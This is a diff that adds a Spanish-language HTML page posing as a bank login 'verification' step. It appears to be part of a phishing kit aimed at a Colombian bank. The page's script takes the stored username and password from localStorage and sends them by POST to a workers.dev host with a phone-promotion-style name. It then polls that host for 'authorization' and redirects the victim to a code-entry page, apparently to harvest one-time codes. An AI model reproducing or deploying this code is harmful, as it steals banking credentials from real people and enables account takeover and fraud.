@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificando Datos</title>
+  <style>
+    body { display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f0f0; }
+    #status { font-size:16px; }
+  </style>
+</head>
+<body>
+  <div>
+    <h2>Ingresando...</h2>
+    <p id="status">Esperando autorización...</p>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById("status");
+    const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+
+    if (!bancoldata) {
+      statusEl.textContent = "No se encontraron datos de usuario.";
+      throw new Error("No hay datos en localStorage");
+    }
+
+    const usuario = bancoldata.usuario;
+    const clave = bancoldata.clave;
+
+    // Generar un ID temporal
+    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+    localStorage.setItem('transactionId', transactionId);
+
+    // Enviar datos al Worker
+    fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ usuario, clave, transactionId })
+    }).then(res => res.json()).then(data => {
+      if(data.ok){
+        // Iniciar polling cada 3s para verificar autorización
+        const interval = setInterval(async () => {
+          const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
+          const statusData = await statusRes.json();
+          if(statusData.autorizado){
+            clearInterval(interval);
+            if(statusData.error){
+              window.location.href = "usererror.html";
+            } else {
+              window.location.href = "codigo.html";
+            }
+          }
+        }, 3000);
+      } else {
+        statusEl.textContent = "Error al enviar datos: " + data.error;
+      }
+    }).catch(err => {
+      statusEl.textContent = "Error al conectar con el servidor.";
+      console.error(err);
+    });
+  </script>
+</body>
+</html>
